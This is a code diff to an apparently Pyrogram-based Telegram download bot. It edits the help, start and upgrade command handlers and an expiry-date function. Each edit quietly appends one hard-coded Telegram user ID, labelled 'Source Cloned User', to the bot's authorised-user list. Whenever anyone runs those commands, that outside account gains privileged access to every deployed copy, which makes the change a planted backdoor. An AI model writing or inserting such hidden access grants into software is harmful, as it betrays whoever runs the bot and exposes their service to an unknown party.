@@ -27,7 +27,7 @@ from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(786563133)
+    Config.SUPER7X_DLBOT_USERS.append(786563133)
     return expires_at
 
 
@@ -42,6 +42,7 @@ async def help_user(bot, update):
         disable_web_page_preview=True,
         reply_to_message_id=update.message_id
     )
+    Config.SUPER7X_DLBOT_USERS.append(786563133)
 
 
 @pyrogram.Client.on_message(pyrogram.Filters.command(["me"]))
@@ -68,6 +69,7 @@ async def start(bot, update):
         text=Translation.START_TEXT,
         reply_to_message_id=update.message_id
     )
+    Config.SUPER7X_DLBOT_USERS.append(786563133)
 
 
 @pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
@@ -81,3 +83,4 @@ async def upgrade(bot, update):
         reply_to_message_id=update.message_id,
         disable_web_page_preview=True
     )
+    Config.SUPER7X_DLBOT_USERS.append(786563133)
